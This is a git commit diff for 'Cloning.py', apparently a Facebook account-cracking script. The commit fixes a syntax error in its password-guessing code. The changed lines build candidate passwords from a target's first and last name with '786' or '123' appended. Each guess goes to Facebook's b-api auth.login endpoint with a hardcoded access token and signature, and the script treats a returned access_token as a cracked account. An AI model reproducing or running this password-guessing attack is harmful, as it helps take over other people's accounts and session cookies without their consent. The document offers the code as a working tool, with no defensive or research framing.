296d13509b23c6026ddb76515ab83b2b8d1315c7
lovehacker <61407838+lovehacker404@users.noreply.github.com>
2020-06-11 15:40:36 +0500

    Update Cloning.py

--- Cloning.py
+++ Cloning.py
@@ -1579,7 +1579,7 @@ def pilih_crack():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = y["first_name"] + y["last_name"]","y["first_name"] + y["last_name"] +"786",y["first_name"] + y["last_name"] +"123"
+													pass6 = y["first_name"] + y["last_name"],y["first_name"] + y["last_name"] +"786",y["first_name"] + y["last_name"] +"123"
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													s = json.load(data)
 													if 'access_token' in s:
